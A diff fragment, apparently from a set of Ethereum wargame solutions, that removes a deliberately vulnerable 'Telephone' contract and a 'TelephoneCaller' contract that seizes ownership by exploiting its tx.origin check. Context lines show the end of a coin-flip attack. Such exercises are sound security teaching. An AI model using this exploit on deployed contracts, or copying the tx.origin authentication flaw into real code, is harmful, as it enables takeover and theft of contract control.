@@ -55,28 +55,3 @@ uint256 FACTOR = 578960446186580977117854925043439539266349923328202820197287920
         _coinI.flip(side);
 }
 }
-contract Telephone {
-    address public owner;
-
-    constructor() {
-        owner = msg.sender;
-    }
-
-    function changeOwner(address _owner) public {
-        if (tx.origin != msg.sender) {
-            owner = _owner;
-        }
-    }
-}
-interface TelephoneI {
-    function changeOwner(address _owner) external ;
-}
-contract TelephoneCaller {
-    TelephoneI public _telephoneI;
-            constructor(address  _contractAddress) {
-    _telephoneI = TelephoneI(_contractAddress);
-    }
-    function call(address _newOwner)public  {
-_telephoneI.changeOwner(_newOwner);
-    }
-}
